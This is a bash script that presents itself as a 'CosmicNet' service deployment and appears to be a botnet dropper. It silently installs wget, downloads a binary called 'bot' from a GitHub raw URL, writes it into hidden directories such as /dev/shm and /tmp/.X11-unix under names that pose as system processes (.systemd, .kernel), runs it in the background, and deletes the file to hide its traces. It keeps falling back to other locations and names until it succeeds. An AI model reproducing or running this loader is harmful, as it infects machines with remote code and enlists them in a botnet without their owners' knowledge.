#!/bin/bash

# Function to check and install dependencies
install_dependencies() {
    echo "Checking system environment..."
    
    # Check for wget and install if missing
    if ! command -v wget >/dev/null 2>&1; then
        echo "Updating system components..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update >/dev/null 2>&1
            apt-get install -y wget >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y wget >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y wget >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm wget >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add wget >/dev/null 2>&1
        elif command -v pkg >/dev/null 2>&1; then
            pkg install -y wget >/dev/null 2>&1
        elif command -v brew >/dev/null 2>&1; then
            brew install wget >/dev/null 2>&1
        else
            echo "System update required"
            return 1
        fi
        
        if ! command -v wget >/dev/null 2>&1; then
            echo "Component installation incomplete"
            return 1
        fi
    fi

    # Determine system architecture for executable
    detect_architecture() {
        local arch
        arch=$(uname -m)
        case "$arch" in
            x86_64|amd64)
                echo "amd64"
                ;;
            i386|i686|x86)
                echo "386"
                ;;
            armv7l|armhf)
                echo "armv7"
                ;;
            aarch64|arm64)
                echo "arm64"
                ;;
            armv5*)
                echo "armv5"
                ;;
            armv6*)
                echo "armv6"
                ;;
            mips|mips64)
                echo "mips"
                ;;
            *)
                echo "unknown"
                ;;
        esac
    }

    ARCH=$(detect_architecture)
    OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    # Store architecture info for later use
    export SYSTEM_ARCH="$ARCH"
    export SYSTEM_OS="$OS"
    
    return 0
}

# Function to download and run the executable
deploy_bot() {
    local download_url="https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot"
    local temp_dirs=(
        "/tmp" "/var/tmp" "/dev/shm" 
        "/data/data/com.termux/files/usr/tmp"
        "/data/data/com.termux/files/usr/var/tmp"
        "$HOME/.cache" "$HOME/.local/tmp" "$HOME/.config/tmp"
        "$HOME/.temp" "$HOME/.hidden" "$HOME/.cosmic"
        "/sdcard/Android/data/.hidden/tmp"
        "/private/tmp" "/usr/local/tmp"
        "/tmp/.hidden" "/var/tmp/.hidden"
        "/tmp/.X11-unix" "/var/tmp/.system"
    )
    
    # Create additional hidden directories
    mkdir -p "$HOME/.hidden" "$HOME/.cosmic" "/tmp/.hidden" "/var/tmp/.hidden" "/tmp/.X11-unix" 2>/dev/null
    
    for p in "${temp_dirs[@]}"; do
        if [ -d "$p" ] && [ -w "$p" ]; then
            cd "$p" || continue
            
            # Download with retry logic
            for attempt in {1..3}; do
                echo "Attempt $attempt: Downloading executable..."
                if wget -q --timeout=30 --tries=3 "$download_url" -O .cosmicnet 2>/dev/null; then
                    if [ -f ".cosmicnet" ] && [ -s ".cosmicnet" ]; then
                        # Make executable
                        chmod +x .cosmicnet 2>/dev/null
                        
                        # Check if it's actually executable
                        if [ ! -x ".cosmicnet" ]; then
                            # Try to fix permissions
                            chmod 755 .cosmicnet 2>/dev/null
                        fi
                        
                        # Kill any existing instances
                        pkill -f ".cosmicnet" 2>/dev/null
                        sleep 1
                        
                        # Start new instance
                        echo "Starting executable..."
                        nohup ./.cosmicnet > /dev/null 2>&1 &
                        
                        sleep 2
                        
                        if pgrep -f ".cosmicnet" > /dev/null; then
                            # Clean up download file after successful start
                            rm -f .cosmicnet 2>/dev/null
                            echo "✓ CosmicNet service activated"
                            return 0
                        else
                            # Try alternative execution method
                            echo "Trying alternative execution..."
                            ./.cosmicnet > /dev/null 2>&1 &
                            sleep 2
                            if pgrep -f ".cosmicnet" > /dev/null; then
                                rm -f .cosmicnet 2>/dev/null
                                echo "✓ CosmicNet service activated"
                                return 0
                            fi
                        fi
                    fi
                    rm -f .cosmicnet 2>/dev/null
                else
                    echo "Download failed, retrying..."
                fi
                sleep 1
            done
        fi
    done
    
    return 1
}

# Function to create a fallback directory and try there
create_fallback_deployment() {
    local fallback_dirs=(
        "$HOME/.cache/system"
        "$HOME/.local/share/data" 
        "/tmp/.$(whoami)"
        "/var/tmp/.$(whoami)"
        "/tmp/.cache"
        "/var/tmp/.data"
        "$HOME/.cosmic/bin"
        "/usr/local/bin/.hidden"
    )
    
    for dir in "${fallback_dirs[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            cd "$dir" 2>/dev/null || continue
            
            for i in {1..3}; do
                echo "Fallback attempt $i in $dir..."
                if wget -q --timeout=45 "$1" -O cosmic 2>/dev/null && [ -s cosmic ]; then
                    chmod +x cosmic
                    
                    # Try to execute
                    nohup ./cosmic > /dev/null 2>&1 &
                    sleep 3
                    
                    if pgrep -f "cosmic" > /dev/null; then
                        echo "✓ Background service started from $dir"
                        return 0
                    else
                        # Try direct execution
                        ./cosmic > /dev/null 2>&1 &
                        sleep 2
                        if pgrep -f "cosmic" > /dev/null; then
                            echo "✓ Background service started"
                            return 0
                        fi
                    fi
                fi
                sleep 2
            done
        fi
    done
    return 1
}

# Function to try different executable names
try_different_names() {
    local download_url="https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot"
    local executable_names=(
        ".cosmicnet" ".systemd" ".kernel" ".service"
        "cosmic" "netd" "sysd" "runtime"
    )
    
    for name in "${executable_names[@]}"; do
        echo "Trying with name: $name"
        if wget -q "$download_url" -O "$name" 2>/dev/null && [ -s "$name" ]; then
            chmod +x "$name"
            nohup "./$name" > /dev/null 2>&1 &
            sleep 3
            
            if pgrep -f "$name" > /dev/null; then
                echo "✓ Service started as $name"
                # Clean up the file if it's not the standard name
                if [ "$name" != ".cosmicnet" ]; then
                    rm -f "$name" 2>/dev/null
                fi
                return 0
            fi
            rm -f "$name" 2>/dev/null
        fi
    done
    return 1
}

# Function to check if executable is actually a binary
verify_executable() {
    local file="$1"
    if [ -f "$file" ]; then
        # Check if it's an executable binary
        if file "$file" 2>/dev/null | grep -q "ELF\|executable\|binary"; then
            return 0
        fi
        # Check if it has execute permission and isn't a text file
        if [ -x "$file" ] && ! file "$file" 2>/dev/null | grep -q "text\|script"; then
            return 0
        fi
    fi
    return 1
}

# Main execution function
main() {
    echo "Starting CosmicNet deployment..."
    
    # Install dependencies first
    if ! install_dependencies; then
        echo "Failed to install dependencies"
        exit 1
    fi
    
    echo "System: $SYSTEM_OS, Architecture: $SYSTEM_ARCH"
    
    # Try primary deployment
    echo "Attempting primary deployment..."
    if deploy_bot; then
        echo "Deployment successful"
        exit 0
    fi
    
    # Try different executable names
    echo "Trying different executable names..."
    if try_different_names; then
        echo "Deployment successful"
        exit 0
    fi
    
    # Try fallback deployment
    echo "Attempting fallback deployment..."
    local download_url="https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot"
    
    if create_fallback_deployment "$download_url"; then
        echo "Fallback deployment successful"
        exit 0
    fi
    
    # Final attempt - direct download and run
    echo "Final attempt..."
    if wget -q "$download_url" -O .cosmic_exec 2>/dev/null && [ -s .cosmic_exec ]; then
        chmod +x .cosmic_exec
        
        # Verify it's actually an executable
        if verify_executable ".cosmic_exec"; then
            nohup ./.cosmic_exec > /dev/null 2>&1 &
            sleep 3
            if pgrep -f ".cosmic_exec" > /dev/null; then
                rm -f .cosmic_exec 2>/dev/null
                echo "✓ Service initialized"
                exit 0
            else
                # Try to run it directly
                ./.cosmic_exec &
                sleep 2
                if pgrep -f ".cosmic_exec" > /dev/null; then
                    rm -f .cosmic_exec 2>/dev/null
                    echo "✓ Service initialized"
                    exit 0
                fi
            fi
        else
            echo "Downloaded file is not a valid executable"
        fi
        rm -f .cosmic_exec 2>/dev/null
    fi
    
    echo "Deployment failed"
    exit 1
}

# Run the main function
main
